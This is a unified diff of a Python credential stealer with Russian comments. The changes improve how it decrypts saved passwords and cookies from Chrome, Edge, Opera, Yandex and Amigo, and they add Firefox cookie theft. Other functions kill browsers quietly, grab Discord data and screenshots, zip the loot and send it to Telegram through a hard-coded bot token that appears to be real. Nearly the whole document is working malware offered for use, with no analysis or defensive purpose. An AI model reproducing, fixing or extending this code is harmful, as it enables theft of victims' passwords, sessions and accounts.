@@ -12,6 +12,7 @@ import time
 from datetime import datetime
 from urllib.request import urlopen
 from PIL import ImageGrab
+import browser_cookie3
 import shutil
 import base64
 import re
@@ -19,9 +20,18 @@ import cv2
 import sys
 from pathlib import Path
 from Cryptodome.Cipher import AES
-import win32crypt
-import winreg
-import ctypes
+
+# Исправленный импорт для Windows-специфичных модулей
+if platform.system() == "Windows":
+    try:
+        import win32crypt
+        HAS_WIN32CRYPT = hasattr(win32crypt, 'CryptUnprotectData')
+    except (ImportError, AttributeError):
+        HAS_WIN32CRYPT = False
+    import winreg
+    import ctypes
+else:
+    HAS_WIN32CRYPT = False
 
 # Конфигурация Telegram
 TELEGRAM_BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
@@ -53,6 +63,7 @@ BROWSERS = {
     "amigo": "Amigo Browser",
     "edge": "Microsoft Edge"
 }
+
 
 def create_directories():
     """Гарантированно создает все необходимые директории"""
@@ -300,140 +311,175 @@ def steal_discord_data():
             json.dump(stolen_data, f)
 
 def get_encryption_key(profile_path):
-    """Получает ключ шифрования для браузера"""
+    """Получает ключ шифрования с поиском Local State в родительской папке"""
+    if platform.system() != "Windows" or not HAS_WIN32CRYPT:
+        return None
+    
+    # Поиск Local State в текущей и родительской папке
+    local_state_path = Path(profile_path) / "Local State"
+    if not local_state_path.exists():
+        parent_local_state = Path(profile_path).parent / "Local State"
+        if parent_local_state.exists():
+            local_state_path = parent_local_state
+        else:
+            print(f"Файл Local State не найден: {local_state_path}")
+            return None
+    
     try:
-        # Ищем файл Local State в родительской папке профиля
-        local_state_path = Path(profile_path).parent / "Local State"
-        if not local_state_path.exists():
-            # Попробуем найти в папке User Data
-            user_data_path = Path(profile_path).parent.parent / "Local State"
-            if user_data_path.exists():
-                local_state_path = user_data_path
-            else:
-                print(f"Файл Local State не найден для {profile_path}")
-                return None
-        
-        with open(local_state_path, "r", encoding="utf-8") as f:
+        with open(local_state_path, 'r', encoding='utf-8') as f:
             local_state = json.loads(f.read())
         
+        # Проверка наличия ключа os_crypt
+        if "os_crypt" not in local_state:
+            print(f"Ключ 'os_crypt' не найден в {local_state_path}")
+            return None
+            
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
-        
-        # Исправление опечатки: CryptUnprotectData вместо CryptUnprotectedData
-        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        encrypted_key = encrypted_key[5:]
+        try:
+            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        except Exception as e:
+            print(f"Ошибка в win32crypt.CryptUnprotectData: {e}")
+            return None
     except Exception as e:
-        print(f"Ошибка получения ключа шифрования для {profile_path}: {e}")
+        print(f"Ошибка получения ключа {profile_path}: {e}")
         return None
 
-def decrypt_password(ciphertext, key):
-    """Расшифровывает пароль с использованием ключа"""
+def decrypt_password(password, key):
+    """Расшифровывает пароль"""
     try:
-        if not ciphertext:
-            return ""
-        
-        # Для старых версий, защищенных только DPAPI
-        if isinstance(ciphertext, bytes) and len(ciphertext) > 0 and ciphertext[0] != b'v'[0]:
+        if not key and platform.system() == "Windows" and HAS_WIN32CRYPT:
             try:
-                return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
+                return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8')
             except:
                 return ""
         
-        # Для новых версий с AES-GCM
-        if key and isinstance(ciphertext, bytes) and len(ciphertext) > 15:
-            iv = ciphertext[3:15]
-            payload = ciphertext[15:]
+        if key and isinstance(password, bytes) and len(password) > 15:
+            iv = password[3:15]
+            payload = password[15:]
             cipher = AES.new(key, AES.MODE_GCM, iv)
-            decrypted = cipher.decrypt(payload)
-            return decrypted[:-16].decode()  # Удалить аутентификационный тег
-        
-        return ""
-    except Exception as e:
-        print(f"Ошибка дешифровки: {e}")
-        return ""
-
-def steal_browser_data(browser_name, profile_path, data_type):
-    """Крадет данные браузера (пароли или куки)"""
-    try:
-        # Определяем пути к файлам данных
-        if data_type == "passwords":
-            db_file = profile_path / "Login Data"
-            table = "logins"
-            columns = "origin_url, username_value, password_value"
-        elif data_type == "cookies":
-            db_file = profile_path / "Network" / "Cookies"
-            table = "cookies"
-            columns = "host_key, name, value, path, expires_utc, is_secure, encrypted_value"
-        else:
-            return []
-        
-        if not db_file.exists():
-            return []
-        
-        # Создаем временную копию файла
-        temp_db = Path(tempfile.gettempdir()) / f"temp_{data_type}_{browser_name}_{random.randint(1000,9999)}.db"
-        shutil.copy2(str(db_file), str(temp_db))
-        
-        # Получаем ключ шифрования
-        key = get_encryption_key(profile_path)
-        
-        data = []
-        conn = sqlite3.connect(str(temp_db))
-        cursor = conn.cursor()
-        cursor.execute(f"SELECT {columns} FROM {table}")
-        
-        for row in cursor.fetchall():
             try:
-                if data_type == "passwords":
-                    url, username, password_value = row
-                    decrypted_pass = decrypt_password(password_value, key)
-                    if decrypted_pass:
-                        data.append({
-                            'url': url,
-                            'username': username,
-                            'password': decrypted_pass
-                        })
-                
-                elif data_type == "cookies":
-                    host, name, value, path, expires, secure, encrypted_value = row
-                    # Используем encrypted_value если обычное значение пустое
-                    cookie_value = encrypted_value if not value else value
-                    decrypted_value = decrypt_password(cookie_value, key) if isinstance(cookie_value, bytes) else cookie_value
-                    
-                    data.append({
-                        'host': host,
-                        'name': name,
-                        'value': decrypted_value,
-                        'path': path,
-                        'expires': expires,
-                        'secure': bool(secure)
+                decrypted_pass = cipher.decrypt(payload)[:-16].decode()
+                return decrypted_pass
+            except:
+                pass
+        
+        if platform.system() == "Windows" and HAS_WIN32CRYPT:
+            try:
+                return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8')
+            except:
+                return ""
+    except:
+        pass
+    return ""
+
+def steal_chrome_passwords(browser_name, profile_path):
+    """Крадет пароли из браузеров на основе Chromium (старая версия)"""
+    try:
+        key = get_encryption_key(str(Path(profile_path).parent))
+        login_db = os.path.join(profile_path, "Login Data")
+        
+        if not os.path.exists(login_db):
+            return []
+        
+        # Создаем временную копию файла паролей
+        temp_db = os.path.join(tempfile.gettempdir(), f"temp_pass_{browser_name}_{random.randint(1000,9999)}.db")
+        shutil.copy2(login_db, temp_db)
+        
+        passwords = []
+        conn = sqlite3.connect(temp_db)
+        conn.text_factory = bytes  # Для обработки бинарных данных
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        
+        for item in cursor.fetchall():
+            try:
+                url, username, password_value = item
+                decrypted_pass = decrypt_password(password_value, key)
+                if decrypted_pass:
+                    passwords.append({
+                        'url': url.decode('utf-8', errors='ignore') if isinstance(url, bytes) else url,
+                        'username': username.decode('utf-8', errors='ignore') if isinstance(username, bytes) else username,
+                        'password': decrypted_pass
                     })
-            except Exception as e:
-                print(f"Ошибка обработки записи {data_type}: {e}")
+            except:
                 continue
         
         conn.close()
-        try:
-            os.remove(str(temp_db))  # Удаляем временный файл
-        except:
-            pass
-        return data
+        os.remove(temp_db)
+        return passwords
     except Exception as e:
-        print(f"Ошибка при краже {data_type} для {browser_name}: {e}")
+        print(f"Ошибка при краже паролей {browser_name}: {e}")
+        return []
+
+def steal_chromium_cookies(browser_name, profile_path):
+    """Крадет куки из браузеров на основе Chromium (старая версия)"""
+    try:
+        key = get_encryption_key(str(Path(profile_path).parent))
+        cookie_db = os.path.join(profile_path, "Network", "Cookies")
+        
+        if not os.path.exists(cookie_db):
+            return []
+        
+        # Создаем временную копию файла куки
+        temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookie_{browser_name}_{random.randint(1000,9999)}.db")
+        shutil.copy2(cookie_db, temp_db)
+        
+        cookies = []
+        conn = sqlite3.connect(temp_db)
+        conn.text_factory = bytes  # Для обработки бинарных данных
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, encrypted_value FROM cookies")
+        
+        for item in cursor.fetchall():
+            try:
+                host, name, value, path, expires, secure, encrypted_value = item
+                # Используем encrypted_value если обычное значение пустое
+                cookie_value = value if value else encrypted_value
+                
+                if isinstance(cookie_value, bytes):
+                    decrypted_value = decrypt_password(cookie_value, key)
+                else:
+                    decrypted_value = cookie_value
+                
+                cookies.append({
+                    'host': host.decode('utf-8', errors='ignore') if isinstance(host, bytes) else host,
+                    'name': name.decode('utf-8', errors='ignore') if isinstance(name, bytes) else name,
+                    'value': decrypted_value,
+                    'path': path.decode('utf-8', errors='ignore') if isinstance(path, bytes) else path,
+                    'expires': expires,
+                    'secure': bool(secure)
+                })
+            except Exception as e:
+                print(f"Ошибка обработки куки: {e}")
+                continue
+        
+        conn.close()
+        os.remove(temp_db)
+        return cookies
+    except Exception as e:
+        print(f"Ошибка при краже куки {browser_name}: {e}")
         return []
 
 def steal_passwords():
     """Крадет пароли из всех доступных браузеров"""
     try:
-        PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
-        print(f"[Кража паролей] Папка: {PASSWORDS_DIR}")
+        # Гарантируем существование папки
+        if not PASSWORDS_DIR.exists():
+            PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
+        
+        print(f"[Кража паролей] Папка для сохранения: {PASSWORDS_DIR}")
         
         # Пути к профилям браузеров
+        appdata = BROWSER_DATA_DIR
+        roaming = Path(os.getenv("APPDATA") or "")
+        
         browser_paths = {
-            "chrome": BROWSER_DATA_DIR / "Google" / "Chrome" / "User Data" / "Default",
-            "edge": BROWSER_DATA_DIR / "Microsoft" / "Edge" / "User Data" / "Default",
-            "opera": Path(os.getenv("APPDATA")) / "Opera Software" / "Opera Stable",
-            "yandex": BROWSER_DATA_DIR / "Yandex" / "YandexBrowser" / "User Data" / "Default",
-            "amigo": BROWSER_DATA_DIR / "Amigo" / "User Data" / "Default"
+            "chrome": appdata / "Google" / "Chrome" / "User Data" / "Default",
+            "edge": appdata / "Microsoft" / "Edge" / "User Data" / "Default",
+            "opera": roaming / "Opera Software" / "Opera Stable",
+            "yandex": appdata / "Yandex" / "YandexBrowser" / "User Data" / "Default",
+            "amigo": appdata / "Amigo" / "User Data" / "Default"
         }
         
         for browser_name, display_name in BROWSERS.items():
@@ -441,43 +487,49 @@ def steal_passwords():
                 passwords = []
                 
                 if browser_name == "firefox":
-                    print(f"Для {display_name} пароли не поддерживаются")
-                    continue
-                
-                if browser_name in browser_paths:
+                    print(f"Для браузера {display_name} пароли не поддерживаются")
+                elif browser_name in browser_paths:
                     path = browser_paths[browser_name]
                     if path.exists():
-                        print(f"Обработка {display_name}")
+                        print(f"Обработка браузера: {display_name}")
                         if platform.system() == "Windows":
                             stealthy_kill_browser(browser_name)
                             time.sleep(1)
-                        passwords = steal_browser_data(browser_name, path, "passwords")
+                        passwords = steal_chrome_passwords(browser_name, str(path))
                 
+                # Сохраняем пароли в other/passwords
                 if passwords:
                     password_file = PASSWORDS_DIR / f"{display_name}_Passwords.json"
                     with open(password_file, 'w', encoding='utf-8') as f:
                         json.dump(passwords, f, indent=4, ensure_ascii=False)
                         print(f"Пароли {display_name} сохранены: {len(passwords)} записей")
                 else:
-                    print(f"Для {display_name} пароли не найдены")
+                    print(f"Для браузера {display_name} пароли не найдены")
+                        
             except Exception as e:
-                print(f"Ошибка для {display_name}: {e}")
+                print(f"Общая ошибка при краже паролей {browser_name}: {e}")
     except Exception as e:
         print(f"Критическая ошибка в steal_passwords: {e}")
 
 def steal_cookies():
     """Крадет куки из всех доступных браузеров"""
     try:
-        COOKIE_DIR.mkdir(parents=True, exist_ok=True)
-        print(f"[Кража cookies] Папка: {COOKIE_DIR}")
+        # Гарантируем существование папки
+        if not COOKIE_DIR.exists():
+            COOKIE_DIR.mkdir(parents=True, exist_ok=True)
+        
+        print(f"[Кража cookies] Папка для сохранения: {COOKIE_DIR}")
         
         # Пути к профилям браузеров
+        appdata = BROWSER_DATA_DIR
+        roaming = Path(os.getenv("APPDATA") or "")
+        
         browser_paths = {
-            "chrome": BROWSER_DATA_DIR / "Google" / "Chrome" / "User Data" / "Default",
-            "edge": BROWSER_DATA_DIR / "Microsoft" / "Edge" / "User Data" / "Default",
-            "opera": Path(os.getenv("APPDATA")) / "Opera Software" / "Opera Stable",
-            "yandex": BROWSER_DATA_DIR / "Yandex" / "YandexBrowser" / "User Data" / "Default",
-            "amigo": BROWSER_DATA_DIR / "Amigo" / "User Data" / "Default"
+            "chrome": appdata / "Google" / "Chrome" / "User Data" / "Default",
+            "edge": appdata / "Microsoft" / "Edge" / "User Data" / "Default",
+            "opera": roaming / "Opera Software" / "Opera Stable",
+            "yandex": appdata / "Yandex" / "YandexBrowser" / "User Data" / "Default",
+            "amigo": appdata / "Amigo" / "User Data" / "Default"
         }
         
         for browser_name, display_name in BROWSERS.items():
@@ -485,27 +537,41 @@ def steal_cookies():
                 cookies = []
                 
                 if browser_name == "firefox":
-                    print(f"Для {display_name} куки не поддерживаются")
-                    continue
-                
-                if browser_name in browser_paths:
+                    # Для Firefox используем browser_cookie3
+                    try:
+                        jar = browser_cookie3.firefox()
+                        for cookie in jar:
+                            cookies.append({
+                                'host': cookie.domain,
+                                'name': cookie.name,
+                                'value': cookie.value,
+                                'path': cookie.path,
+                                'expires': cookie.expires,
+                                'secure': cookie.secure
+                            })
+                        print(f"Куки Firefox успешно получены")
+                    except Exception as e:
+                        print(f"Не удалось получить куки для Firefox: {e}")
+                elif browser_name in browser_paths:
                     path = browser_paths[browser_name]
                     if path.exists():
-                        print(f"Обработка {display_name}")
+                        print(f"Обработка браузера: {display_name}")
                         if platform.system() == "Windows":
                             stealthy_kill_browser(browser_name)
                             time.sleep(1)
-                        cookies = steal_browser_data(browser_name, path, "cookies")
+                        cookies = steal_chromium_cookies(browser_name, str(path))
                 
+                # Сохраняем куки в other/cookies
                 if cookies:
                     cookie_file = COOKIE_DIR / f"{display_name}_Cookies.json"
                     with open(cookie_file, 'w', encoding='utf-8') as f:
                         json.dump(cookies, f, indent=4, ensure_ascii=False)
                         print(f"Куки {display_name} сохранены: {len(cookies)} записей")
                 else:
-                    print(f"Для {display_name} куки не найдены")
+                    print(f"Для браузера {display_name} куки не найдены")
+                        
             except Exception as e:
-                print(f"Ошибка для {display_name}: {e}")
+                print(f"Общая ошибка при краже куки {browser_name}: {e}")
     except Exception as e:
         print(f"Критическая ошибка в steal_cookies: {e}")
 
@@ -591,7 +657,7 @@ def take_screenshot():
         return False
 
 def create_zip():
-    """Создает ZIP-архив с данными"""
+    """Создает ZIP-архив с данными, гарантируя включение всех папок"""
     zip_name = f"system_data_{random.randint(1000,9999)}.zip"
     zip_path = Path(tempfile.gettempdir()) / zip_name
     
@@ -756,6 +822,7 @@ def main_workflow():
     
     if zip_file:
         send_to_telegram(zip_file)
+
 
 if __name__ == "__main__":
     # Проверка блокировки
